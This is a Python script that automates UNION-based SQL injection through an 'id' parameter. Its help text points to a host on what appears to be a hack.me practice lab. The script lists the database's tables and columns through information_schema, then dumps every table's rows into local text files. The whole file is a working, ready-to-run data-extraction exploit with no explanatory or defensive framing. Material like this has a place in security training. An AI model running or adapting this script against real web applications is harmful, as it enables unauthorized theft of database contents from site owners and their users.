import requests, sys
from bs4 import BeautifulSoup
import argparse


def check_args():
    parse = argparse.ArgumentParser()

    parse.add_argument('-u', '--url', help='enter url: -u http://s100296-101309-kq1.sipontum.hack.me')

    args_list = parse.parse_args()

    return args_list.url



tables = {}
columns = {}

target = check_args()

if target is None:
    sys.exit("blank target. run as 'python3 auto_inject --help' for help")


def pull(url, result, product=None, action='tables'):

    response = "OK"
    i = 0

    while response.startswith("OK"):
            injection = url + str(i) + ",1--+"

            row = requests.get(injection)
            html = BeautifulSoup(row.text, 'lxml')
            try:
                response = html.find('li').text
                if action == 'rows':
                    info = response.split('|')[1]
                else:
                    info = response.split('.')[1].split()[0]
            except:
                break

            if action == 'tables':
                result[i] = info
            elif action == 'columns' and product is not None:
                try:
                    result[product].append(info)
                except KeyError:
                    result[product] = [info]
            else:
                with open(product+".txt", 'a') as dump:
                    dump.write(info + "\n")

            print(f"[+] {str(i)}: {info}")
            i += 1



table_injection = target + "/tshit.php?id=-1%20union%20select%201,2,table_name,4,5%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20"
print('[!]Available tables: ')

pull(table_injection, tables)


for table in tables.values():
    print(f'[!] Pulling columns from {table}')
    inj = target + f"/tshit.php?id=-1 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='{table}' limit%20"
    pull(inj, columns, product=table, action='columns')


for key, value in columns.items():
    print(f'[!] Pulling rows from {key}')
    cols = ",':',".join(value)
    inj = target + f"/tshit.php?id=-1 union select 1,2,concat('|',{cols},'|'),4,5 from {key} limit%20"
    pull(inj, None, product=key, action='rows')
    print(f'[*] Table {key} was successfully dumped')